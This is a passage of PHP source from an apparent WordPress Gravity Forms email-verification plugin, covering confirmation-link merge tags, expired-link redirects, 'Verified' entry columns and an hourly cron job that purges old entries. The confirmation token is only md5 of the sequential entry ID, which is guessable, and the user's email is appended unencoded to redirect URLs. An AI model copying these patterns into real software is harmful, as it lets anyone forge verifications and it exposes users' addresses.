                } else {

                    $validate_expired_link_page = rgar($form, 'validate_expired_link_page');
                    $validate_expired_link_show_message = rgar($form, 'validate_expired_link_show_message');
                    $validate_expired_link_url = rgar($form, 'validate_expired_link_url');

                    if (isset($validate_expired_link_show_message) && $validate_expired_link_show_message == 'redirect') {
                        $redirect_url = $validate_expired_link_url ? $validate_expired_link_url : home_url();

                    } elseif (isset($validate_expired_link_show_message) && $validate_expired_link_show_message == 'page') {
                        if (isset($validate_expired_link_page)) {
                            $redirect_url = get_permalink($validate_expired_link_page);
                        } else {
                            $redirect_url = home_url();
                        }

                    } else {
                        $redirect_url = home_url();
                    }

                    //get email
                    $ab_gw_confirm_append_email_to_url = rgar($form, 'ab_gw_confirm_append_email_to_url');
                    if ($ab_gw_confirm_append_email_to_url == 1) {
                        $email_field = '';
                        foreach ($form['notifications'] as $notification) {
                            if ($notification['event'] == 'verification_email') {
                                $email_field = $notification['to'];
                            }
                        }
                        $email_notification = '';
                        if (isset($entry[$email_field]))
                            $email_notification = $entry[$email_field];
                        if (strpos($redirect_url, '?') !== false) {
                            $redirect_url .= '&email=' . $email_notification;
                        } else {
                            $redirect_url .= '?email=' . $email_notification;
                        }
                    }

                    wp_redirect(esc_url($redirect_url));
                }
            }
        }

    }

    public static function replace_user_id_merge_tag_confirmation_link($text, $form, $entry)
    {
        $merge_tag = '{confirmation_link}';

        if (strpos($text, $merge_tag) === false || empty($entry) || empty($form)) {
            return $text;
        }
        $url = home_url();
        $url = add_query_arg('email_verification', md5($entry['id']), $url);

        // $url = add_query_arg( 'form_entry_id',$entry['id'] ,$url );
        $html = '<a href="' . $url . '">' . $url . '</a>';

        $html = str_replace($merge_tag, $html, $text);

        return apply_filters( 'gfeva_merge_tag_confirmation_link_html', $html );
    }

    public static function replace_user_id_merge_tag_confirmation_url($text, $form, $entry)
    {
        $merge_tag = '{confirmation_url}';

        if (strpos($text, $merge_tag) === false || empty($entry) || empty($form)) {
            return $text;
        }
        $url = home_url();
        $url = add_query_arg('email_verification', md5($entry['id']), $url);

        // $url = add_query_arg( 'form_entry_id',$entry['id'] ,$url );
        $html = $url;

        $html = str_replace($merge_tag, $html, $text);

        return apply_filters( 'gfeva_merge_tag_confirmation_url_html', $html );
    }

    public static function replace_user_id_merge_tag_confirm_url($text, $form, $entry)
    {
        $merge_tag = '{confirm_url}';

        if (strpos($text, $merge_tag) === false || empty($entry) || empty($form)) {
            return $text;
        }
        $url = home_url();
        $url = add_query_arg('email_verification', md5($entry['id']), $url);

        // $url = add_query_arg( 'form_entry_id',$entry['id'] ,$url );
        $html = '<a href="' . $url . '">' . $url . '</a>';

        $html = str_replace($merge_tag, $html, $text);

        return apply_filters( 'gfeva_merge_tag_confirm_url_html', $html );
    }

    public static function replace_user_id_merge_tag_confirm_link($text, $form, $entry)
    {
        $merge_tag = '{confirm_link}';

        if (strpos($text, $merge_tag) === false || empty($entry) || empty($form)) {
            return $text;
        }
        $url = home_url();
        $url = add_query_arg('email_verification', md5($entry['id']), $url);

        // $url = add_query_arg( 'form_entry_id',$entry['id'] ,$url );
        $html = $url;

        $html = str_replace($merge_tag, $html, $text);

        return apply_filters( 'gfeva_merge_tag_confirm_link_html', $html );
    }


    public function gform_filter_links_entry_list($filter_links, $form, $include_counts)
    {
        $form_id = absint($form['id']);
        $search_criteria['field_filters'][] = array(
            'key' => 'verified',
            'value' => '1'
        );


        $verified_count = GFAPI::count_entries($form_id, $search_criteria);

        $filter_links[] = array(
            'id' => 'verified',
            'field_filters' => array(),
            'count' => $verified_count,
            'label' => esc_html__('Verified', 'gravity-forms-user-verification')
        );

        return $filter_links;


    }

    public function gform_search_criteria_entry_list($search_criteria, $form_id)
    {
        if (isset($_GET['filter']) && $_GET['filter'] == 'verified') {
            $search_criteria['field_filters'][] = array(
                'key' => 'verified',
                'value' => '1'
            );
        };
        return $search_criteria;

    }

    public function gform_export_fields($form)
    {
        array_push($form['fields'], array(
            'id' => 'verified',
            'label' => __('Verified', 'gravity-forms-user-verification')
        ));

        array_push($form['fields'], array(
            'id' => 'verified_date',
            'label' => __('Verified Date', 'gravity-forms-user-verification')
        ));

        return $form;

    }


    public function gform_custom_entry_meta($entry_meta, $form_id)
    {

        $entry_meta['verified'] = array(
            'label' => __('Verified', 'gravity-forms-user-verification'),
            'is_numeric' => true,
            'is_default_column' => true,
            'filter' => array(
                'operators' => array(
                    'is',
                    'isnot'
                ),
                'choices' => array(
                    array(
                        'text' => 'Yes',
                        'value' => 1
                    )
                )

            )

        );

        $entry_meta['verified_date'] = array(
            'label' => __('Verified Date', 'gravity-forms-user-verification'),
            'is_numeric' => false,
            'is_default_column' => true

        );

        return $entry_meta;
    }

    public static function gform_email_verified_checker($entry, $form)
    {
        /*first check by ip*/
        $ab_gw_confirm_every_time = rgar($form, 'ab_gw_confirm_every_time');
        if($ab_gw_confirm_every_time == 1){
            return false;
        } else {
            $emails = array();
            $email_fields = GFCommon::get_email_fields($form);
            if ($email_fields && is_array($email_fields))
                foreach ($email_fields as $key => $fields) {
                    $emails[] = rgar($entry, $fields['id']);
                    $find_entrires = 0;
                }
            foreach ($emails as $email) {

                $find_entrires = self::find_verified_entry_by_email($form['id'], $email);
            }

            return ($find_entrires > 0) ? true : false;
        }
    }


    public static function find_verified_entry_by_email($form_id, $email)
    {

        $search_criteria['field_filters'][] = array(
            'value' => $email
        );
        $search_criteria['field_filters'][] = array(
            'key' => 'verified',
            'value' => '1'
        );
        $entries = GFAPI::count_entries($form_id, $search_criteria);

        return $entries;

    }


    public static function find_verified_entry_by_ip($form_id, $ip)
    {

        $search_criteria['ip'] = $ip;
        $search_criteria['field_filters'][] = array(
            'key' => 'verified',
            'value' => '1'
        );
        $entries = GFAPI::count_entries($form_id, $search_criteria);
        return $entries;
    }

    public function gform_entries_field_value($value, $form_id, $field_id, $entry)
    {
        if (isset($field_id) && $field_id == 'verified' && isset($value) && $value == 1) {
            $value = '<img width="25" id="verified_image_' . esc_attr($entry['id']) . '" src="' . plugins_url('images/verified.png', __FILE__) . '" />';
        }
        if (isset($field_id) && $field_id == 'verified_date' && isset($value) && !empty($value)) {
            $theDate = date_create_from_format('Y-m-d H:i:s', $value);
            $theDate = date_format($theDate, 'd. F Y \a\t g:i a');

            $value = '<span>'.$theDate.'</span>';
        } else  if (isset($field_id) && $field_id == 'verified_date') {
            $value = '<span>-</span>';
        }

        return $value;
    }

    function add_list_column_merge_tag( $merge_tags, $form_id, $fields, $element_id ) {

        $merge_tags[] = array(
            'label' => __('Confirm HTML link', 'gravity-forms-user-verification'),
            'tag' => '{confirm_url}',
	        'group'=> 'Other'
        );
        $merge_tags[] = array(
            'label' => __('Confirm link - without HTML', 'gravity-forms-user-verification'),
            'tag' => '{confirm_link}',
	        'group'=> 'Other'
        );
        return $merge_tags;
    }

    function pem_gform_entry_detail_meta_boxes( $meta_boxes, $entry, $form ) {
        //$fields = GFAPI::get_fields_by_type( $form, array( 'verified' ) );

        //if ( ! empty( $fields ) ) {
        $meta_boxes['gf_verified'] = array(
            'title'    => esc_html__( 'Verified', 'gravityformsverified' ),
            'callback' => array( $this, 'add_verified_meta_box' ),
            'context'  => 'side',
        );
        // }

        return $meta_boxes;
    }

    /**
     * The callback used to echo the content to the meta box.
     *
     * @param array $args An array containing the form and entry objects.
     */
    public function add_verified_meta_box( $args ) {

        $form  = $args['form'];
        $entry = $args['entry'];
        $html = '<div class="verified-meta-box" style="display: flex;align-items: center;">';

        if (isset($entry['verified']) &&  $entry['verified'] == 1) {
            $html .= '<img width="25" id="verified_image_' . esc_attr($entry['id']) . '" src="' . plugins_url('images/verified.png', __FILE__) . '" />';

            if (isset($entry['verified_date'])) {
                $theDate = date_create_from_format('Y-m-d H:i:s', $entry['verified_date']);
                $theDate = date_format($theDate, 'd. F Y \a\t g:i a');
                $html .= ' - '.__('at', 'gravity-forms-user-verification'). ' '. $theDate;
            }
        } else {
            $html .= __('Not Verified', 'gravity-forms-user-verification');
        }

        $html .='</div>';
        echo $html;
    }
}


function gw_ab_manual_notifications()
{
    return GW_AB_Manual_Notifications::get_instance();
}

if (! wp_next_scheduled ( 'ab_gw_my_hourly_event' )) {
    wp_schedule_event(time(), 'hourly', 'ab_gw_my_hourly_event');
}

gw_ab_manual_notifications();


add_action('ab_gw_my_hourly_event', 'ab_gw_do_this_hourly');

function ab_gw_do_this_hourly() {
    // do something every hour
    $forms = GFAPI::get_forms();
    foreach($forms AS $form){
        $ab_gw_delete_conf_entries = rgar($form, 'ab_gw_delete_conf_entries');
        $ab_gw_delete_conf_entries_interval = rgar($form, 'ab_gw_delete_conf_entries_interval');
        $ab_gw_delete_unconf_entries = rgar($form, 'ab_gw_delete_unconf_entries');
        $ab_gw_delete_unconf_entries_interval = rgar($form, 'ab_gw_delete_unconf_entries_interval');
        if($ab_gw_delete_conf_entries == '1'){
            $search_criteria['field_filters'][] = array(
                'key' => 'verified',
                'value' => '1'
            );
            $entries = GFAPI::get_entries($form['id'], $search_criteria, null, null);

            foreach ($entries AS $entry){
            	$date_created = $entry['date_created'];
            	$now = strtotime("now");
            	$timestamp_entry = strtotime($date_created);

            	$interval_passed = $now - $timestamp_entry;
            	if($interval_passed > $ab_gw_delete_conf_entries_interval*60*60){
                    GFAPI::delete_entry( $entry['id'] );
	            }
            }
        }

        if($ab_gw_delete_unconf_entries == '1'){
//            $search_criteria['field_filters'][] = array(
//                'key' => 'verified',
//                'value' => '0'
//            );
            $entries = GFAPI::get_entries($form['id'], null, null, null);

            foreach ($entries AS $entry){
                if(!isset($entry['verified']) || (isset($entry['verified']) && $entry['verified'] != 1) ) {
                    $date_created = $entry['date_created'];
                    $now = strtotime("now");
                    $timestamp_entry = strtotime($date_created);

                    $interval_passed = $now - $timestamp_entry;
                    if ($interval_passed > $ab_gw_delete_unconf_entries_interval * 60 * 60) {
                        GFAPI::delete_entry($entry['id']);
                    }
                }
            }
        }
    }
}
?>
